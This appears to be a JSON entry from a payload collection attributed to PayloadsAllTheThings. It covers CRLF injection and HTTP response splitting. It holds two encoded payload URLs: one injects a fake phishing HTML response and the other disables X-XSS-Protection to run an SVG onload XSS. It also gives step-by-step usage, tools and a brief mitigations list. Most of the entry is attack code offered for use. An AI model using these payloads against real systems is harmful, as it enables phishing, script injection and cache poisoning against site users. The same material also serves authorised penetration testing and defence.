{"id": "payload_000010", "important": {"title": "CRLF Injection - Response Splitting (XSS / Phishing / Cache Poisoning)", "category": "Injection", "sub_category": "HTTP Response Splitting", "tags": ["crlf", "response-splitting", "xss", "phishing", "cache-poisoning"], "targets": {"os": ["Any"], "system": ["HTTP Server", "Proxy", "Cache"]}, "risk": "critical"}, "variants": [{"match": {"os": ["Any"], "system": ["HTTP Server"]}, "payload": {"explanation": "Split response to inject an entire HTML body (phishing/XSS).", "code": "POC_URL = \"https://victim.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E\"", "run_context": "browser (to render injected HTML) or curl -v to inspect raw response", "placeholders": {"victim_endpoint": "https://victim.example.net/index.php"}, "notes": "Requires server to embed the parameter into header or link context; modern mitigations may neutralize."}}, {"match": {"os": ["Any"], "system": ["HTTP Server"]}, "payload": {"explanation": "Disable X-XSS-Protection and inject SVG payload via response splitting to trigger XSS.", "code": "URL_FRAGMENT = \"%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0\"\nPOC = \"https://example.com/\" + URL_FRAGMENT", "run_context": "browser or Burp Repeater", "placeholders": {"example_url": "https://example.com/"}, "notes": "Some caches/proxies or browsers may block the effect; test in controlled environment."}}], "usage": {"steps": ["Locate a parameter reflected into header/link context or into server-generated HTTP headers.", "Append encoded CRLF sequences plus crafted header/body to split the response.", "Verify the server returns a secondary response or injected body using curl -v or Burp's raw response view.", "If successful, check whether injected content is cached by proxies (cache poisoning) or rendered (XSS/phishing)."], "tools": ["Burp Suite", "curl -v", "Browser (devtools)"], "required_params": {"target_url": {"required": true, "example": "https://victim.example.net/index.php?lang=<payload>"}, "payload_param": {"required": true, "example": "lang"}}, "code_samples": [{"title": "Response Splitting PoC (Phishing HTML)", "description": "Example PoC URL that induces a secondary HTTP response containing attacker HTML.", "code": "https://victim.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E", "placeholders": {"TARGET": "https://victim.example.net/index.php"}, "run_context": "browser"}, {"title": "XSS via Injected X-XSS-Protection and SVG", "description": "Example URL that disables XSS protection and injects SVG onload payload.", "code": "https://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0", "placeholders": {"TARGET": "https://example.com/"}, "run_context": "browser"}], "mitigations": ["Validate and encode user input used in headers/links.", "Reject or sanitize CR/LF characters in parameters that influence response generation.", "Ensure HTTP/2 server implementations are patched against splitting attacks."], "references": ["PortSwigger - HTTP/2 request splitting via CRLF injection", "Root Me - CRLF"]}, "system": {"version": "2.0.0", "source": "PayloadsAllTheThings"}}
